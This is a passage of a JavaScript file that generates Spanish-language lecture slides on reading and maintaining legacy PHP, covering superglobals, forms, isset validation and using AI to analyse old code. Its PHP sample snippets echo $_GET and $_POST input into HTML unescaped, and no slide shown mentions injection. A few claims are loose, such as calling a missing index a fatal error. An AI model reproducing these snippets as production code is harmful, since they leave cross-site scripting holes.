const fs = require("fs");
const path = require("path");
const PptxGenJS = require("../../../../../tools/slides-system/node_modules/pptxgenjs");
const slidesSystem = require("../../../../../tools/slides-system/dist/index.js");

const { theme, components, utils } = slidesSystem;
const { applyAiepTheme, TOKENS: C, TYPOGRAPHY } = theme;
const {
  addHeader: systemAddHeader,
  addCard,
  addMiniCard,
  addCenterStatement,
  addCodePanel,
  addDelegationSplit,
  addMarkBox,
  addChip,
  addChecklistGrid,
  addMythRealityGrid,
  addAgentOrchestrationDiagram,
  addPromptQualityCompare,
  addTableSchema,
  addAgenticFlow,
} = components;
const { validateSlide } = utils;

const pptx = new PptxGenJS();
pptx.layout = "LAYOUT_WIDE";

applyAiepTheme(pptx, {
  author: "Diego Obando",
  company: "AIEP",
  subject: "Clase 16",
  title: "Lectura e Integración con Código Legado",
});

const SH = pptx.ShapeType;
const rootDir = path.resolve(__dirname, "..");
const outputPptx = path.join(rootDir, "Clase-16-Legacy-PHP.pptx");
const outputJs = __filename;

const logoPath = path.resolve(__dirname, "../../../../../.agent/skills/slides-aiep/assets/logo-aiep.png");
const logoMarkPath = path.resolve(__dirname, "../../../../../.agent/skills/slides-aiep/assets/logo-aiep-mark.png");

// ─── HELPERS ─────────────────────────────────────────────────────────────────

function addHeader(slide, title, subtitle, blockLabel = "Bloque 1", pptxLike = pptx) {
  systemAddHeader(slide, SH, pptxLike, title, subtitle, blockLabel, {
    classLabel: `Clase 16 · ${blockLabel}`,
    logoMarkPath,
    titleY: 0.94,
    titleH: 0.66,
    subtitleY: 1.68,
    subtitleH: 0.22,
    subtitleW: 9.05,
    subtitleFontSize: 10.6,
  });
}

function addBarsMotif(slide, x, y, scale = 1, fill = C.red) {
  slide.addShape(SH.rect, { x, y: y + 0.18 * scale, w: 0.2 * scale, h: 0.46 * scale, fill: { color: fill }, line: { color: fill } });
  slide.addShape(SH.rect, { x: x + 0.24 * scale, y, w: 0.24 * scale, h: 0.64 * scale, fill: { color: fill }, line: { color: fill } });
  slide.addShape(SH.rect, { x: x + 0.52 * scale, y: y + 0.18 * scale, w: 0.2 * scale, h: 0.46 * scale, fill: { color: fill }, line: { color: fill } });
}

// ─── INTRODUCCIÓN ────────────────────────────────────────────────────────────

function createCoverSlide() {
  const slide = pptx.addSlide();
  slide.background = { color: C.navy };
  slide.addImage({ path: logoPath, x: 0.88, y: 0.62, w: 1.2, h: 0.42 });
  addBarsMotif(slide, 0.88, 1.84, 1.4, C.red);
  slide.addText("Lectura e Integración con\nCódigo Legado", {
    x: 0.88, y: 2.82, w: 10.26, h: 1.44, fontFace: TYPOGRAPHY.display, fontSize: 44, bold: true, color: C.white, margin: 0, valign: "top",
  });
  slide.addText("Semana 06 · Clase 01: El valor del mantenimiento y la arqueología técnica.", {
    x: 0.88, y: 4.42, w: 10.26, h: 0.34, fontFace: TYPOGRAPHY.body, fontSize: 18, color: C.gold, bold: true,
  });
  addMarkBox(slide, SH, logoMarkPath, { x: 9.62, y: 5.82, w: 0.82, h: 0.82 });
  validateSlide(slide, pptx);
}

function createConnectionSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "¿PHP está muerto?", "El meme vs. la Realidad Laboral", "Contexto");
  addCenterStatement(slide, SH, "El 77% de la Web todavía corre sobre PHP. Los sistemas que hoy facturan millones suelen ser 'Legacy'.", {
    x: 0.88, y: 2.22, w: 10.26, h: 1.12, fill: C.navy, fontSize: 22, color: C.white, rectRadius: 0.08
  });
  
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 3.82, w: 10.26, h: 2.8, title: "Análisis de la Oportunidad Laboral", columns: 3,
    entries: [
      { badge: "VIVO", title: "Sistemas Vivos", body: "Apps que sostienen la operación diaria de empresas reales.", accent: C.gold, fill: C.white, badgeFill: C.gold },
      { badge: "CRIT", title: "Misión Crítica", body: "Reglas de negocio que solo existen en ese código antiguo.", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "OPOR", title: "Oportunidad", body: "Saber mantener es más valioso que solo saber crear.", accent: C.navy, fill: C.white, badgeFill: C.navy },
    ]
  });
  validateSlide(slide, pptx);
}

function createEngineerProfileSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "El Perfil del Ingeniero", "No somos solo 'creadores de apps'", "Mentalidad");
  addDelegationSplit(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Médicos de Sistemas",
    left: { title: "El Amateur", subtitle: "Destructivo", items: ["Dice: 'esto es basura'.", "Quiere borrar y reescribir.", "Ignora los riesgos del negocio."], accent: C.red, fill: C.paleRed },
    right: { title: "El Profesional", subtitle: "Quirúrgico", items: ["Dice: '¿cómo funciona?'.", "Hace cambios incrementales.", "Aplica el Axioma de Integridad."], accent: C.navy, fill: C.softBlue },
    bridgeLabel: "vs", bridgeBody: "criterio\ntécnico",
  });
  validateSlide(slide, pptx);
}

function createObjectivesSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Objetivos de la Sesión", "Nuestra misión para hoy", "Objetivos");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Lo que lograremos", columns: 2,
    entries: [
      { badge: "ARCH", title: "Identificar Estructuras", body: "Diferenciar Arquitectura de Archivos vs Recursos.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "READ", title: "Lectura Técnica", body: "Entender PHP legacy sin entrar en pánico.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "SESS", title: "Gestionar Estado", body: "Dominar sesiones y cookies nativas de servidor.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "ACT", title: "Mantenimiento", body: "Aplicar el Axioma de Integridad en un CRUD real.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
    ]
  });
  validateSlide(slide, pptx);
}

function createLearningPathSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Ruta de Aprendizaje: Hoy", "4 Bloques de Arqueología Técnica", "Mapa");
  const blocks = [
    { title: "Bloque 1", body: "Psicología y Valor del Legado.", active: true },
    { title: "Bloque 2", body: "PHP Esencial y Superglobales.", active: false },
    { title: "Bloque 3", body: "Sesiones y Estado del Usuario.", active: false },
    { title: "Bloque 4", body: "Mantenimiento Quirúrgico CRUD.", active: false },
  ];
  blocks.forEach((b, i) => {
    addMiniCard(slide, SH, {
      x: 0.88 + i * 2.6, y: 3.6, w: 2.4, h: 2.8, title: b.title, body: b.body, accent: b.active ? C.red : C.navy,
      fill: b.active ? C.paleRed : C.white, line: C.border, titleFontSize: 12, bodyFontSize: 9.5
    });
  });
  validateSlide(slide, pptx);
}

function createIntegrityPrincipleSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Principio de Integridad Técnica", "Estabilidad vs. Impulso de Reescritura", "Ingeniería");
  addCenterStatement(slide, SH, "En sistemas de misión crítica, la estabilidad es el activo más valioso. Un ingeniero profesional no borra: comprende, protege e interviene con precisión.", {
    x: 0.88, y: 2.22, w: 10.26, h: 2.5, fill: C.navy, color: C.white, fontSize: 24, bold: true, rectRadius: 0.08
  });
  validateSlide(slide, pptx);
}

// ─── BLOQUE 1: PSICOLOGÍA Y VALOR DEL CÓDIGO LEGADO ──────────────────────────

function createBlock1IntroSlide() {
  const slide = pptx.addSlide();
  slide.background = { color: C.navy };
  addMarkBox(slide, SH, logoMarkPath, { x: 9.62, y: 0.28, w: 0.68, h: 0.68 });
  addChip(slide, SH, "BLOQUE 1", { x: 0.88, y: 0.68, w: 1.32, h: 0.34, fill: C.red, color: C.white, fontSize: 10.6 });
  addBarsMotif(slide, 0.88, 1.22, 1.1, C.red);
  slide.addText("Psicología y Valor del\nCódigo Legado", {
    x: 0.88, y: 2.14, w: 9.2, h: 1.26, fontFace: TYPOGRAPHY.display, fontSize: 36, bold: true, color: C.white, valign: "mid",
  });
  slide.addText("Entendiendo por qué lo 'viejo' sostiene el presente.", {
    x: 0.88, y: 3.62, w: 8.2, h: 0.38, fontFace: TYPOGRAPHY.body, fontSize: 15.2, color: "DCE6F2",
  });
  validateSlide(slide, pptx);
}

function createLegacyDefinitionSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "¿Qué es realmente el Código Legado?", "Bloque 1 · 1.1 El valor del negocio", "Bloque 1");
  addMythRealityGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Cambiando la perspectiva",
    entries: [
      { badge: "MITO", myth: "'Es código basura escrito por alguien que no sabía'.", reality: "Es código que ha sobrevivido al tiempo y ataques reales.", accent: C.red, badgeFill: C.paleRed },
      { badge: "MITO", myth: "'Es aburrido y no tiene valor tecnológico'.", reality: "Es el sistema que paga los sueldos y sostiene el negocio.", accent: C.red, badgeFill: C.paleRed },
      { badge: "FACT", myth: "El código legacy es un activo.", reality: "Contiene décadas de reglas de negocio que nadie documentó.", accent: C.navy, badgeFill: C.softBlue },
      { badge: "FACT", myth: "Mantenimiento = Ingeniería.", reality: "Se requiere más nivel para reparar que para crear de cero.", accent: C.navy, badgeFill: C.softBlue },
    ]
  });
  validateSlide(slide, pptx);
}

function createArchFilesVsResourcesSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Archivos vs. Recursos", "Bloque 1 · 1.2 Diferencia Estructural", "Bloque 1");
  addDelegationSplit(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "¿Cómo llegamos al dato?",
    left: { title: "FastAPI (Moderno)", subtitle: "Recursos Lógicos", items: ["URL abstraída (/users/5).", "El framework rutea.", "Independiente del disco."], accent: C.navy, fill: C.softBlue },
    right: { title: "PHP Legacy", subtitle: "Archivos Físicos", items: ["URL directa (detalle.php).", "La carpeta es la API.", "Si el archivo no está, la ruta cae."], accent: C.red, fill: C.paleRed },
    bridgeLabel: "vs", bridgeBody: "organización",
  });
  validateSlide(slide, pptx);
}

function createFolderIsApiSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "La Carpeta es la API", "Bloque 1 · 1.2 Organización física", "Bloque 1");
  addCenterStatement(slide, SH, "En el legado, si mueves o renombras un archivo físico, destruyes el punto de acceso.", {
    x: 0.88, y: 2.22, w: 10.26, h: 0.82, fill: C.navy, fontSize: 18, color: C.white
  });
  
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 3.42, w: 10.26, h: 3.2, title: "Mapeo Físico vs. Lógico", columns: 3,
    entries: [
      { badge: "INDEX", title: "/index.php", body: "Punto de entrada principal. Suele contener el dashboard o la lista principal.", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "AUTH", title: "/login.php", body: "Procesador de credenciales. Recibe el POST y crea la sesión.", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "ADMIN", title: "/admin/edit.php", body: "Ruta protegida. El anidamiento de carpetas define la jerarquía.", accent: C.gold, fill: C.white, badgeFill: C.gold },
    ]
  });
  validateSlide(slide, pptx);
}

function createSpaghettiPatternSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "El Patrón 'Espagueti'", "Bloque 1 · 1.3 Mezcla de responsabilidades", "Bloque 1");
  addCard(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 1.6, title: "¿Por qué todo está mezclado?",
    body: "En PHP legacy, es normal encontrar SQL, lógica de negocio y HTML en el mismo archivo. Era el estándar de inmediatez antes de los frameworks.",
    accent: C.red, fill: C.white, line: C.border
  });
  addCodePanel(slide, SH, {
    x: 0.88, y: 4.02, w: 10.26, h: 2.74, title: "Anatomía de un archivo mezclado",
    code: `<?php $res = mysqli_query($conn, "SELECT..."); ?> <!-- Capa de Datos -->
<?php if ($res) { ?> <!-- Capa de Lógica -->
    <h1><?php echo $res['name']; ?></h1> <!-- Capa de Vista -->
<?php } ?>`,
    lang: "html", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createIaArchaeologistSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "IA como Arqueóloga de Software", "Bloque 1 · 1.4 Estrategia de Exploración", "IA");
  
  addPromptQualityCompare(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.46,
    title: "Cambiando el objetivo del Prompt",
    badTitle: "El Error de Reescritura",
    badSubtitle: "Intento de modernización ciega",
    badPrompt: "'Este código es viejo, reescríbelo en FastAPI para que sea moderno'.",
    badNotes: [
      "Ignora dependencias ocultas.",
      "Rompe la base de datos actual.",
      "Crea un sistema incompatible."
    ],
    goodTitle: "El Enfoque de Arqueología",
    goodSubtitle: "Exploración y Diagnóstico",
    goodPrompt: "'Analiza este PHP: lista qué variables recibe, qué tablas consulta y qué validaciones hace'.",
    goodNotes: [
      "Extrae reglas de negocio reales.",
      "Identifica puntos de falla.",
      "Mantiene el sistema estable."
    ],
    footer: "La IA no es tu reemplazo, es tu microscopio para entender sistemas complejos."
  });
  validateSlide(slide, pptx);
}

function createExplorationStrategySlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Estrategia de Exploración", "Bloque 1 · 1.4 ¿Qué leer primero?", "Bloque 1");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Mapa de Reconocimiento del Sistema", columns: 2,
    entries: [
      { badge: "CONN", title: "Capa de Conexión", body: "Busca archivos como 'config.php' o 'db.php'. Identifica el servidor, usuario y base de datos.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "POST", title: "Captura de Entradas", body: "Identifica todas las variables $_POST. Ellas definen qué datos está esperando el script.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
      { badge: "SQL", title: "Lógica de Persistencia", body: "Localiza los comandos INSERT, UPDATE o DELETE. Es el corazón de la operación.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "OUT", title: "Inyección de Datos", body: "Busca dónde se imprimen variables en el HTML. Define qué verá el usuario final.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
    ]
  });
  validateSlide(slide, pptx);
}

function createBlock1QuestionsSlide() {
  const slide = pptx.addSlide();
  slide.background = { color: C.warm };
  addMarkBox(slide, SH, logoMarkPath, { x: 9.62, y: 0.28, w: 0.68, h: 0.68 });
  addChip(slide, SH, "PREGUNTAS GUÍA — BLOQUE 1", { x: 0.88, y: 0.44, w: 3.4, h: 0.3, fill: C.navy, color: C.white, fontSize: 10.0 });
  const questions = [
    { n: "01", text: "¿Por qué proponer una 'reescritura total' es un riesgo financiero?" },
    { n: "02", text: "¿Qué significa que la estructura de carpetas sea la API en PHP legacy?" },
    { n: "03", text: "¿Cómo puede un agente de IA ayudar a entender un archivo de 500 líneas?" },
  ];
  questions.forEach((q, i) => {
    const y = 1.12 + i * 1.96;
    slide.addText(q.n, { x: 0.88, y: y + 0.04, w: 0.58, h: 0.68, fontFace: TYPOGRAPHY.display, fontSize: 38, bold: true, color: C.border, margin: 0, valign: "mid" });
    slide.addText(q.text, { x: 1.6, y, w: 8.72, h: 1.56, fontFace: TYPOGRAPHY.body, fontSize: 15.6, color: C.navy, margin: 0, valign: "mid" });
    if (i < 2) slide.addShape(SH.line, { x: 0.88, y: y + 1.72, w: 10.28, h: 0, line: { color: C.border, pt: 1 } });
  });
  validateSlide(slide, pptx);
}

function createBlock1SynthesisSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Síntesis del Bloque 1", "Dignificando el Legado", "Bloque 1");
  addCenterStatement(slide, SH, "El legado no es un estorbo, es un activo funcional que requiere respeto y maestría técnica.", {
    x: 0.88, y: 2.22, w: 10.26, h: 1.14, fill: C.navy, color: C.white, fontSize: 18, rectRadius: 0.07
  });
  addMiniCard(slide, SH, {
    x: 0.88, y: 5.92, w: 10.26, h: 0.62, title: "Próximo Bloque → PHP Esencial",
    body: "Ahora que entendemos su valor, aprenderemos a leer su idioma nativo.",
    fill: C.softNeutral, line: C.softNeutral, accent: C.gold, titleFontSize: 11, bodyFontSize: 10.4
  });
  validateSlide(slide, pptx);
}

// ─── BLOQUE 2: PHP ESENCIAL Y SUPERGLOBALES ──────────────────────────────────

function createBlock2IntroSlide() {
  const slide = pptx.addSlide();
  slide.background = { color: C.navy };
  addMarkBox(slide, SH, logoMarkPath, { x: 9.62, y: 0.28, w: 0.68, h: 0.68 });
  addChip(slide, SH, "BLOQUE 2", { x: 0.88, y: 0.68, w: 1.32, h: 0.34, fill: C.red, color: C.white, fontSize: 10.6 });
  addBarsMotif(slide, 0.88, 1.22, 1.1, C.red);
  slide.addText("PHP Esencial y\nSuperglobales", {
    x: 0.88, y: 2.14, w: 9.2, h: 1.26, fontFace: TYPOGRAPHY.display, fontSize: 36, bold: true, color: C.white, valign: "mid",
  });
  slide.addText("Aprendiendo a leer el idioma que sostiene la web.", {
    x: 0.88, y: 3.62, w: 8.2, h: 0.38, fontFace: TYPOGRAPHY.body, fontSize: 15.2, color: "DCE6F2",
  });
  validateSlide(slide, pptx);
}

function createSurvivalSyntax1Slide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Sintaxis de Supervivencia I: Variables", "Bloque 2 · 2.1 Declaración y Tipado", "Bloque 2");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Variables y Tipado Dinámico",
    code: `<?php
$nombre = "Juan";      // String
$edad = 25;           // Integer
$precio = 19.99;      // Float
$es_valido = true;    // Boolean

// PHP es permisivo: no requiere declarar tipos (pero es peligroso)
$variable = "Texto";
$variable = 100;      // Cambio de tipo dinámico`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createSurvivalSyntax2Slide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Sintaxis II: Strings y Concatenación", "Bloque 2 · 2.1 El punto en lugar del más", "Bloque 2");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Operaciones con Texto", columns: 2,
    entries: [
      { badge: "DOT", title: "Concatenación", body: "Usa el punto (.) para unir textos. Ejemplo: 'Hola ' . $user", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "QUOTE", title: "Comillas Simples", body: "Texto literal. No procesa variables internas.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "DBL", title: "Comillas Dobles", body: "Interpolación: \"Hola $nombre\" funciona directamente.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "WARN", title: "Confusión Común", body: "No uses + para concatenar; PHP intentará sumar matemáticamente.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
    ]
  });
  validateSlide(slide, pptx);
}

function createAssociativeArraysSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Arreglos Asociativos (El Corazón)", "Bloque 2 · 2.1 Los 'Diccionarios' de PHP", "Bloque 2");
  addCenterStatement(slide, SH, "Son la estructura fundamental para transportar datos desde la DB y los formularios.", {
    x: 0.88, y: 2.22, w: 10.26, h: 0.82, fill: C.red, color: C.white, fontSize: 18
  });
  addCodePanel(slide, SH, {
    x: 0.88, y: 3.2, w: 5.0, h: 3.56, title: "Sintaxis de Arreglo",
    code: `$producto = [
    "id" => 101,
    "sku" => "TECH-01",
    "precio" => 25000,
    "disponible" => true
];`,
    lang: "php", fontSize: 16
  });
  addTableSchema(slide, SH, {
    x: 6.14, y: 3.2, w: 5.0, title: "Estructura en Memoria",
    columns: [
      { name: "Key (Índice)", type: "Value (Valor)" },
      { name: "id", type: "101" },
      { name: "sku", type: "'TECH-01'" },
      { name: "precio", type: "25000" }
    ]
  });
  validateSlide(slide, pptx);
}

function createForeachSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Bucles de Lectura: foreach", "Bloque 2 · 2.1 Procesando colecciones", "Bloque 2");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Recorriendo resultados de base de datos",
    code: `<?php
$usuarios = [["name" => "Ana"], ["name" => "Luis"]];

foreach ($usuarios as $u) {
    echo "<li>" . $u['name'] . "</li>";
}

// Ventaja: No necesitas conocer el largo (count) del arreglo.`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createPhpHtmlSandwichSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "El Sándwich PHP/HTML", "Bloque 2 · 2.2 Renderizado en Servidor", "Bloque 2");
  addDelegationSplit(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "¿Qué ve cada uno?",
    left: { title: "El Servidor", subtitle: "Ejecuta", items: ["Lee el archivo .php.", "Busca etiquetas <?php ?>.", "Calcula la lógica."], accent: C.red, fill: C.paleRed },
    right: { title: "El Navegador", subtitle: "Muestra", items: ["Recibe solo HTML puro.", "No sabe que existió PHP.", "Renderiza el texto."], accent: C.navy, fill: C.softBlue },
    bridgeLabel: "→", bridgeBody: "envía\nHTML",
  });
  validateSlide(slide, pptx);
}

function createOutputTagsSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Etiquetas de Salida e Inyección", "Bloque 2 · 2.2 Escribiendo en el HTML", "Bloque 2");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Formas de mostrar datos",
    code: `<!-- Forma clásica -->
<h1><?php echo $titulo; ?></h1>

<!-- Atajo moderno (Short echo tag) -->
<p><?= $descripcion ?></p>

<!-- Depuración (Solo para programadores) -->
<pre><?php print_r($mi_arreglo); ?></pre>`,
    lang: "html", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createSuperglobalsIntroSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Las Superglobales", "Bloque 2 · 2.3 El origen de la verdad", "Bloque 2");
  addCenterStatement(slide, SH, "Son arreglos asociativos creados por el servidor que contienen datos de la petición HTTP.", {
    x: 0.88, y: 2.22, w: 10.26, h: 1.12, fill: C.navy, color: C.white, fontSize: 20
  });
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 3.6, w: 10.26, h: 3.16, title: "Las más importantes hoy", columns: 2,
    entries: [
      { badge: "GET", title: "$_GET", body: "Datos visibles en la URL (Query Params).", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "POST", title: "$_POST", body: "Datos ocultos en el cuerpo (Formularios).", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "SESS", title: "$_SESSION", body: "Datos persistentes del usuario en el servidor.", accent: C.gold, fill: C.white, badgeFill: C.gold },
      { badge: "SERV", title: "$_SERVER", body: "Información técnica (IP, Browser, Ruta).", accent: C.navy, fill: C.white, badgeFill: C.navy },
    ]
  });
  validateSlide(slide, pptx);
}

function createGetMethodSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "$_GET: La Verdad en la URL", "Bloque 2 · 2.3 Parámetros de consulta", "Bloque 2");
  addCard(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 1.4, title: "Uso de GET",
    body: "Se utiliza para 'pedir' o 'filtrar' información. Todo lo que esté después del signo '?' en la URL llega a este arreglo.",
    accent: C.navy, fill: C.white, line: C.border
  });
  addCodePanel(slide, SH, {
    x: 0.88, y: 3.82, w: 10.26, h: 2.94, title: "Ejemplo: perfil.php?id=42&tema=oscuro",
    code: `<?php
$id_usuario = $_GET['id'];     // Vale 42
$preferencia = $_GET['tema'];  // Vale "oscuro"

echo "Viendo el perfil del ID: " . $id_usuario;`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createPostMethodSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "$_POST: La Verdad en el Body", "Bloque 2 · 2.3 Procesando formularios", "Bloque 2");
  addCard(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 1.4, title: "Uso de POST",
    body: "Se utiliza para 'enviar' o 'crear' información sensible. Los datos no son visibles en la URL y no tienen límite de tamaño estricto.",
    accent: C.red, fill: C.paleRed, line: C.red
  });
  addCodePanel(slide, SH, {
    x: 0.88, y: 3.82, w: 10.26, h: 2.94, title: "Ejemplo: Registro de usuario",
    code: `<?php
$email = $_POST['correo'];
$pass = $_POST['clave'];

// Lógica de guardado en Base de Datos...
echo "Registro exitoso para: " . $email;`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createFormMappingSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Diagrama de Mapeo de Formulario", "Bloque 2 · 2.3 De HTML a PHP", "Mapeo");
  
  const y = 2.8;
  addCard(slide, SH, { x: 0.88, y, w: 4.5, h: 2.5, title: "Lado del Cliente (HTML)", body: '<input name="user_id" value="5">', accent: C.navy, fill: C.white });
  slide.addText("→", { x: 5.38, y: y + 0.8, w: 1.0, h: 1.0, fontSize: 32, bold: true, color: C.red, align: "center" });
  addCard(slide, SH, { x: 6.38, y, w: 4.76, h: 2.5, title: "Lado del Servidor (PHP)", body: "$_POST['user_id'] // Vale 5", accent: C.red, fill: C.white });

  addCenterStatement(slide, SH, "El atributo 'name' en HTML es la llave del arreglo en PHP.", {
    x: 0.88, y: 5.6, w: 10.26, h: 0.8, fill: C.gold, fontSize: 18, color: C.navy, bold: true
  });
  validateSlide(slide, pptx);
}

function createIssetValidationSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Validación de Existencia", "Bloque 2 · 2.3 Evitando el error 500", "Bloque 2");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "¿Cómo saber si el dato llegó?", columns: 2,
    entries: [
      { badge: "ISSET", title: "isset()", body: "Devuelve true si la variable existe y no es nula. Evita el 'Undefined index'.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "COAL", title: "Operador ??", body: "Asigna un valor por defecto si no existe. $id = $_GET['id'] ?? 0;", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "EMPTY", title: "empty()", body: "Verifica si el valor es 'falsy' (cero, string vacío, false).", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "ERROR", title: "Amnesia de Índices", body: "Intentar leer $_POST['x'] si no se envió causa un error fatal.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
    ]
  });
  validateSlide(slide, pptx);
}

function createIaTranslatorSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "IA como Traductora de Sintaxis", "Bloque 2 · Huella Metodológica", "IA");
  addPromptQualityCompare(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.46,
    title: "Entendiendo el Contrato de Datos",
    badTitle: "El Error de Novato",
    badSubtitle: "Pedir reescritura",
    badPrompt: "'Limpia este código PHP y hazlo más corto'.",
    badNotes: ["Borra validaciones necesarias.", "Cambia nombres de variables.", "Pierde la conexión original."],
    goodTitle: "El Enfoque de Traducción",
    goodSubtitle: "Mapeo a Pseudocódigo",
    goodPrompt: "'Explica qué campos espera este script en $_POST y genera una clase Pydantic equivalente para entenderlo'.",
    goodNotes: ["Mapea el contrato real.", "Documenta el sistema.", "Facilita la futura integración."],
    footer: "Usa la IA para leer lo que no entiendes, no para ignorar el código legacy."
  });
  validateSlide(slide, pptx);
}

function createLightningActivitySlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Actividad Relámpago: Detecta los Inputs", "Bloque 2 · Desafío de lectura", "Práctica");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.0, title: "¿Qué datos necesita este script?",
    code: `<?php
$conn = include('config.php');
$slug = $_GET['slug'];
if (isset($_POST['comentario'])) {
    $txt = $_POST['comentario'];
    $user = $_SESSION['user_id'];
    mysqli_query($conn, "INSERT INTO logs...");
}
?>`,
    lang: "php", fontSize: 18
  });
  addCenterStatement(slide, SH, "Identifica: 1. Un dato de URL | 2. Un dato de Formulario | 3. Un dato de Memoria.", {
    x: 0.88, y: 6.34, w: 10.26, h: 0.6, fill: C.gold, fontSize: 14, color: C.navy, bold: true
  });
  validateSlide(slide, pptx);
}

function createTypingModernSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "La Evolución del Tipado", "Bloque 2 · De lo Dinámico a lo Estricto", "Arquitectura");
  
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 6.8, h: 4.54, title: "PHP 8.0+: Tipado Fuerte Nativo",
    code: `<?php
// Declaración estricta opcional
declare(strict_types=1);

function procesarPago(int $monto, string $moneda): bool {
    // PHP valida los tipos en tiempo de ejecución
    return true;
}

// Union Types (estilo TypeScript)
function buscar(int|string $id) { ... }`,
    lang: "php", fontSize: 16
  });

  addMiniCard(slide, SH, {
    x: 7.94, y: 2.22, w: 3.2, h: 4.54,
    title: "El Fin del Caos",
    body: "1. El tipado dinámico del legado causaba errores silenciosos.\n\n2. PHP moderno permite definir contratos claros (como FastAPI).\n\n3. Usamos IA para 'tipear' el código antiguo durante el mantenimiento.",
    accent: C.navy, fill: C.softBlue, titleFontSize: 14, bodyFontSize: 11
  });
  validateSlide(slide, pptx);
}

function createBlock2QuestionsSlide() {
  const slide = pptx.addSlide();
  slide.background = { color: C.warm };
  addMarkBox(slide, SH, logoMarkPath, { x: 9.62, y: 0.28, w: 0.68, h: 0.68 });
  addChip(slide, SH, "PREGUNTAS GUÍA — BLOQUE 2", { x: 0.88, y: 0.44, w: 3.4, h: 0.3, fill: C.navy, color: C.white, fontSize: 10.0 });
  const questions = [
    { n: "01", text: "¿Qué símbolo distingue a las variables en PHP sin importar su tipo?" },
    { n: "02", text: "¿En qué se diferencia el uso de $_GET frente al de $_POST en un CRUD?" },
    { n: "03", text: "¿Por qué el atributo 'name' de HTML es vital para el servidor PHP?" },
  ];
  questions.forEach((q, i) => {
    const y = 1.12 + i * 1.96;
    slide.addText(q.n, { x: 0.88, y: y + 0.04, w: 0.58, h: 0.68, fontFace: TYPOGRAPHY.display, fontSize: 38, bold: true, color: C.border, margin: 0, valign: "mid" });
